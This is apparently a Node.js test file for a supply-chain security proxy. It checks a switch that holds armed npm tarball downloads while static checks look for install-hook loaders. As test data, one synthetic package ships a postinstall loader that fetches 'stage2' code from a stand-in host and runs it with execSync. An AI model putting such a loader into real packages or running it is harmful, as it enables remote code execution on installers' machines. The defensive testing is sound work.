// 0.1.5 follow-up #15 (operator ruling 2026-10-13, design note §8 item 2; design 0.1.5-FOLLOWUPS #15, 2026-10-14): the per-user
// switch `static_withhold`, off by default. With it on, an ARMED download is held in memory (up to 8 MiB) while the static checks
// read it, so a NAMED static WARN can withhold the download that reveals it; past the cap the download is served and recorded as
// today. While no named static check fires, the switch changes no response and no record (only the time to first byte). The
// server-level withhold of a named static WARN (S0 and S5, named 2026-10-15) is tested in cft015-s9. Tarballs are synthetic; nothing is run.
import test from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { createProxyServer } from '../../proxy/server.js';
import { loadConfig } from '../../proxy/config.js';
import { validateConfig, ConfigUnreadable } from '../../config-store.js';
import { resetDependencyCache } from '../../gates/dependency-cache.js';
import { forgetManifestHooks } from '../../proxy/manifest-check.js';
import { withRole } from '../../gates/row-class.js';

const SC = () => import('../../proxy/static-checks.js');

const H = 3_600_000; const T0 = Date.parse('2026-03-01T00:00:00Z'); const at = (h) => new Date(T0 + h * H).toISOString();
function hdr(name, size) {
  const h = Buffer.alloc(512, 0); Buffer.from(name, 'utf8').copy(h, 0, 0, 100);
  h.write('0000644\0', 100); h.write('0000000\0', 108); h.write('0000000\0', 116); h.write(`${size.toString(8).padStart(11, '0')}\0`, 124, 'latin1');
  h.write('00000000000\0', 136); h.write('        ', 148); h.write('0', 156, 'latin1'); h.write('ustar\0', 257, 'latin1'); h.write('00', 263, 'latin1');
  let sum = 0; for (let i = 0; i < 512; i += 1) sum += h[i]; h.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 'latin1'); return h;
}
const pad = (b) => Buffer.concat([b, Buffer.alloc((512 - (b.length % 512)) % 512, 0)]);
const tgz = (files) => zlib.gzipSync(Buffer.concat([...Object.entries(files).flatMap(([p, c]) => [hdr(`package/${p}`, c.length ?? Buffer.byteLength(c)), pad(Buffer.from(c))]), Buffer.alloc(1024, 0)]));
const LOADER = 'const https = require("https"); const cp = require("child_process");\nhttps.get("https://cdn.example.invalid/stage2", (r) => { let b = ""; r.on("data", (c) => { b += c; }); r.on("end", () => cp.execSync(b)); });\n';
const BENIGN = 'module.exports = 1;\n';
const MiB = 1024 * 1024;

// q: 1.1.0 adds a postinstall in the registry manifest 48 h after a hookless 1.0.0 -> install-introduced WARN (named) -> ARMED.
// Its install.js is a loader -> S1 fires, recorded as NOTE (contributing in 1.2). big: the same shape with a 9 MiB incompressible
// file, so the tarball is over the cap. p: nothing named -> not armed.
const doc = (name, extra = {}) => ({ name, 'dist-tags': { latest: '1.1.0' }, time: { '1.0.0': at(0), '1.1.0': at(48) },
  versions: { '1.0.0': { name, version: '1.0.0', main: 'index.js' }, '1.1.0': { name, version: '1.1.0', main: 'index.js', ...extra } } });
const Q = doc('q', { scripts: { postinstall: 'node install.js' } });
const BIG = doc('big', { scripts: { postinstall: 'node install.js' } });
const P = doc('p');
const DOCS = { '/q': Q, '/big': BIG, '/p': P };
const TARBALLS = {
  '/q/-/q-1.1.0.tgz': tgz({ 'package.json': JSON.stringify(Q.versions['1.1.0']), 'install.js': LOADER, 'index.js': BENIGN }),
  '/big/-/big-1.1.0.tgz': tgz({ 'package.json': JSON.stringify(BIG.versions['1.1.0']), 'install.js': LOADER, 'index.js': BENIGN,
    'blob.bin': crypto.randomBytes(9 * MiB) }),
  '/p/-/p-1.1.0.tgz': tgz({ 'package.json': JSON.stringify(P.versions['1.1.0']), 'index.js': BENIGN }),
};

// The upstream can hold a tarball after its first `split` bytes until `release()` (to see whether the proxy forwards early),
// and can omit Content-Length (chunked) so the cap is met mid-stream rather than announced.
function makeUpstream({ hold = null, chunked = false } = {}) {
  let release; const released = new Promise((r) => { release = r; });
  const server = http.createServer(async (req, res) => {
    const u = decodeURIComponent(req.url.split('?')[0]);
    if (TARBALLS[u]) {
      const body = TARBALLS[u];
      res.writeHead(200, chunked ? { 'content-type': 'application/octet-stream' }
        : { 'content-type': 'application/octet-stream', 'content-length': String(body.length) });
      if (hold && hold.path === u) {
        const split = Math.min(hold.split, body.length - 1);
        res.write(body.subarray(0, split)); await released; res.end(body.subarray(split)); return;
      }
      res.end(body); return;
    }
    if (DOCS[u]) { res.writeHead(200, { 'content-type': 'application/json' }); res.end(JSON.stringify(DOCS[u])); return; }
    res.writeHead(404, { 'content-type': 'application/json' }); res.end('{}');
  });
  return { server, release };
}
async function withProxy(opts, fn) {
  resetDependencyCache(); forgetManifestHooks();
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cft015-s6-'));
  const up = makeUpstream(opts.upstream);
  await new Promise((r) => up.server.listen(0, '127.0.0.1', r));
  const proxy = createProxyServer({ port: 0, host: '127.0.0.1', upstream: `http://127.0.0.1:${up.server.address().port}`,
    witnessDbPath: path.join(dir, 'witness.db'), headersTimeoutMs: 10_000, bodyTimeoutMs: 20_000, ...(opts.config ?? {}) });
  await new Promise((r) => proxy.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${proxy.address().port}`;
  const realErr = console.error; console.error = () => {};
  try { return await fn({ base, proxy, release: up.release }); } finally {
    console.error = realErr; up.release();
    await new Promise((r) => proxy.close(r)); await new Promise((r) => up.server.close(r)); fs.rmSync(dir, { recursive: true, force: true });
    resetDependencyCache(); forgetManifestHooks();
  }
}
const get = (u) => new Promise((resolve, reject) => http.get(u, { agent: false }, (res) => {
  const chunks = []; res.on('data', (x) => chunks.push(x)); res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks) }));
}).on('error', reject));
// how many body bytes the client has received after `ms`, while the upstream still holds the rest
function bytesWithin(u, ms) {
  return new Promise((resolve, reject) => {
    let n = 0; let done = false;
    const req = http.get(u, { agent: false }, (res) => {
      res.on('data', (x) => { n += x.length; });
      res.on('end', () => { if (!done) { done = true; resolve({ n, ended: true, req }); } });
    });
    req.on('error', (e) => { if (!done) reject(e); });
    setTimeout(() => { if (!done) { done = true; resolve({ n, ended: false, req }); } }, ms);
  });
}
const settle = () => new Promise((r) => setTimeout(r, 250));
const staticRowsOf = (proxy, pkg, v) => proxy.witnessDb.getLatestDecision(pkg, v).gates_fired.filter((g) => g.gate.startsWith('static:'));
// the rows are written after the walk ends, which can trail the client's last byte under load: wait for them (bounded)
async function staticRowsEventually(proxy, pkg, v, n = 5, ms = 5000) {
  const until = Date.now() + ms; let rows = staticRowsOf(proxy, pkg, v);
  while (rows.length < n && Date.now() < until) { await new Promise((r) => setTimeout(r, 50)); rows = staticRowsOf(proxy, pkg, v); }
  return rows;
}
const ON = { staticWithhold: true };

// ------------------------------------------------------------------ the switch (configuration)
test('W1 static_withhold is an optional boolean in the config file: absent is off, true/false are kept, anything else refuses', () => {
  assert.equal(validateConfig({ config_version: 1 }).staticWithhold, false);
  assert.equal(validateConfig({ config_version: 1, static_withhold: true }).staticWithhold, true);
  assert.equal(validateConfig({ config_version: 1, static_withhold: false }).staticWithhold, false);
  for (const bad of ['yes', 1, 'true', {}, []]) {
    assert.throws(() => validateConfig({ config_version: 1, static_withhold: bad }), ConfigUnreadable, JSON.stringify(bad));
  }
});

test('W2 the proxy reads static_withhold from the user config file (no seed bundle needed); absent is off', () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cft015-s6-home-'));
  try {
    assert.equal(loadConfig({ CHAINGATE_HOME: home }).staticWithhold, false);
    fs.writeFileSync(path.join(home, 'config.json'), JSON.stringify({ config_version: 1, static_withhold: true }));
    assert.equal(loadConfig({ CHAINGATE_HOME: home }).staticWithhold, true);
  } finally { fs.rmSync(home, { recursive: true, force: true }); }
});

// ------------------------------------------------------------------ the withhold decision (pure)
test('W3 withholdingChecks: only a static row that is a NAMED WARN after its 1.2 role withholds; contributing static rows never do', async () => {
  const S = await SC();
  assert.equal(S.STATIC_WITHHOLD_CAP_BYTES, 8 * MiB);
  const s1 = 'static:S1-loader-in-hook-target'; const s0 = 'static:S0-shell-fetch-in-hook';
  const rows = [{ gate: s1, result: 'WARN', detail: 'x' }, { gate: s0, result: 'ALLOW', detail: 'x' }, { gate: 'install-introduced', result: 'WARN', detail: 'x' }];
  // today: every static gate is contributing, so its WARN becomes NOTE and nothing withholds (the default named list)
  assert.deepEqual(S.withholdingChecks(rows.map(withRole)), []);
  // once a ruling names S1 (injected named list): its WARN withholds; a named non-static row does not (it is served with its notice)
  assert.deepEqual(S.withholdingChecks(rows, [s1, 'install-introduced']), [s1]);
  assert.deepEqual(S.withholdingChecks([{ gate: s1, result: 'NOTE', detail: 'x' }], [s1]), [], 'a NOTE is never a named warning');
  assert.deepEqual(S.withholdingChecks([{ gate: s1, result: 'SKIP', detail: 'x' }], [s1]), [], 'not checked never withholds');
  assert.deepEqual(S.withholdingChecks(null, [s1]), []);
});

// ------------------------------------------------------------------ the server: no behaviour change while everything is contributing
test('W4 switch on, armed, all checks contributing: the same status, bytes and static rows as with the switch off', async () => {
  const off = await withProxy({}, async ({ base, proxy }) => {
    await get(`${base}/q`); const r = await get(`${base}/q/-/q-1.1.0.tgz`); await settle();
    return { status: r.status, body: r.body, rows: await staticRowsEventually(proxy, 'q', '1.1.0') };
  });
  const on = await withProxy({ config: ON }, async ({ base, proxy }) => {
    await get(`${base}/q`); const r = await get(`${base}/q/-/q-1.1.0.tgz`); await settle();
    return { status: r.status, body: r.body, rows: await staticRowsEventually(proxy, 'q', '1.1.0') };
  });
  assert.equal(off.status, 200); assert.equal(on.status, 200);
  assert.ok(on.body.equals(TARBALLS['/q/-/q-1.1.0.tgz']), 'the held bytes are served unchanged');
  assert.ok(off.body.equals(on.body));
  assert.equal(on.rows.length, 10);   // S0-S9 (S6, S7: rulings R2, R3 2026-10-21; S8, S9: 1.8)
  assert.deepEqual(on.rows, off.rows, 'the same rows are recorded');
  assert.equal(on.rows.find((g) => g.gate === 'static:S1-loader-in-hook-target').result, 'NOTE', 'S1 fired and is contributing');
});

test('W5 switch on: an armed download is held until the walk ends (no byte before the upstream finishes); switch off streams at once', async () => {
  const hold = { path: '/q/-/q-1.1.0.tgz', split: 200 };
  const offEarly = await withProxy({ upstream: { hold } }, async ({ base, release }) => {
    await get(`${base}/q`); const r = await bytesWithin(`${base}/q/-/q-1.1.0.tgz`, 400); release(); r.req.destroy(); return r;
  });
  assert.ok(offEarly.n > 0, 'switch off: the first bytes reach npm while the upstream still sends');
  const onEarly = await withProxy({ upstream: { hold }, config: ON }, async ({ base, release }) => {
    await get(`${base}/q`); const r = await bytesWithin(`${base}/q/-/q-1.1.0.tgz`, 400); release(); r.req.destroy(); return r;
  });
  assert.equal(onEarly.n, 0, 'switch on: nothing is sent before the armed walk has read the whole tarball');
});

// 0.1.6 every download is walked (deliberate change of expectation): with the switch on, a download no row arms is held too
test('W6 switch on: a download no row arms is held while the checks read it, then served whole', async () => {
  const hold = { path: '/p/-/p-1.1.0.tgz', split: 100 };
  const r = await withProxy({ upstream: { hold }, config: ON }, async ({ base, release }) => {
    await get(`${base}/p`); const x = await bytesWithin(`${base}/p/-/p-1.1.0.tgz`, 400); release(); x.req.destroy(); return x;
  });
  assert.equal(r.n, 0, 'nothing is sent before the walk has read the whole tarball');
  await withProxy({ config: ON }, async ({ base }) => {
    await get(`${base}/p`); const t = await get(`${base}/p/-/p-1.1.0.tgz`);
    assert.equal(t.status, 200); assert.ok(t.body.equals(TARBALLS['/p/-/p-1.1.0.tgz']), 'served whole');
  });
});

for (const chunked of [false, true]) {
  test(`W7 switch on, past the 8 MiB cap (${chunked ? 'met mid-stream, no Content-Length' : 'announced by Content-Length'}): served while it streams, recorded as today`, async () => {
    const big = TARBALLS['/big/-/big-1.1.0.tgz'];
    assert.ok(big.length > 8 * MiB + 64 * 1024, 'the fixture is over the cap');
    const hold = { path: '/big/-/big-1.1.0.tgz', split: 8 * MiB + 32 * 1024 };
    await withProxy({ upstream: { hold, chunked }, config: ON }, async ({ base, proxy, release }) => {
      await get(`${base}/big`);
      const early = await bytesWithin(`${base}/big/-/big-1.1.0.tgz`, 800);
      assert.ok(early.n > 0, 'past the cap the held bytes are flushed and the rest streams');
      assert.ok(early.n <= hold.split, 'never more than the upstream has sent');
      early.req.destroy(); release();
    });
    // a complete download past the cap: the bytes are the upstream's and the static rows are recorded as with the switch off
    await withProxy({ upstream: { chunked }, config: ON }, async ({ base, proxy }) => {
      await get(`${base}/big`); const r = await get(`${base}/big/-/big-1.1.0.tgz`); await settle();
      assert.equal(r.status, 200); assert.ok(r.body.equals(big));
      const rows = await staticRowsEventually(proxy, 'big', '1.1.0');
      assert.equal(rows.length, 10);   // S0-S9 (S6, S7: rulings R2, R3 2026-10-21; S8, S9: 1.8)
      assert.equal(rows.find((g) => g.gate === 'static:S1-loader-in-hook-target').result, 'NOTE');
    });
  });
}

test('W8 switch on: client aborts while the download is held free the armed slots (the ceiling does not stick); nothing is recorded for them', async () => {
  const S = await SC();
  const hold = { path: '/q/-/q-1.1.0.tgz', split: 200 };
  await withProxy({ upstream: { hold }, config: ON }, async ({ base, proxy, release }) => {
    await get(`${base}/q`);
    const held = [];
    for (let i = 0; i < S.MAX_ARMED_WALKS; i += 1) held.push(await bytesWithin(`${base}/q/-/q-1.1.0.tgz`, 150));
    for (const h of held) { assert.equal(h.n, 0); h.req.destroy(); }
    await settle();
    assert.equal(staticRowsOf(proxy, 'q', '1.1.0').length, 0, 'an aborted download is not recorded');
    release(); await settle();
    const r = await get(`${base}/q/-/q-1.1.0.tgz`); await settle();
    assert.equal(r.status, 200);
    const rows = await staticRowsEventually(proxy, 'q', '1.1.0');
    assert.equal(rows.length, 10);   // S0-S9 (S6, S7: rulings R2, R3 2026-10-21; S8, S9: 1.8)
    assert.ok(rows.every((g) => !/ceiling/.test(g.detail)), 'the later download was armed, not refused a slot');
  });
});
